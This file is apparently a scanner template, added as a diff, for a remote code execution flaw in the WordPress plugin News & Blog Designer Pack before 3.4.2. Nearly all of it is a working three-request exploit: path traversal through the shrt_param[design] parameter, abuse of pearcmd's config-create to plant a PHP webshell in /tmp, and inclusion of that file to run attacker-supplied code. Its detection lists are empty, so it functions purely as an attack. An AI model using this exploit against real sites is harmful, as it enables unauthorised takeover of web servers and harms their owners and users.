@@ -1,0 +1,37 @@
+id: blog-designer-pack-rce
+brief:
+    title: News & Blog Designer Pack < 3.4.2 - Remote Code Execution
+    by: iamnoooob
+    level: critical
+    about: News & Blog Designer Pack contains a local file inclusion vulnerability via user controlled $design variable extracted by POST parameter 'shrt_param' leading to Remote Code Execution via pearcmd.ph...
+    label:
+        - wordpress
+        - wp-plugin
+        - lfi
+        - wp
+        - blogdesignerpack
+        - rce
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: action=bdp_get_more_post
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php?+config-create+/&/<?=base64_decode($_GET[0])?>+/tmp/{{randstr}}.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: '&action=bdp_get_more_post&shrt_param[design]=../../../../../../../../usr/local/lib/php/pearcmd'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-admin/admin-ajax.php?0={{marker}}'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: '&action=bdp_get_more_post&shrt_param[design]=../../../../../../../../tmp/{{randstr}}'
+      signs: []
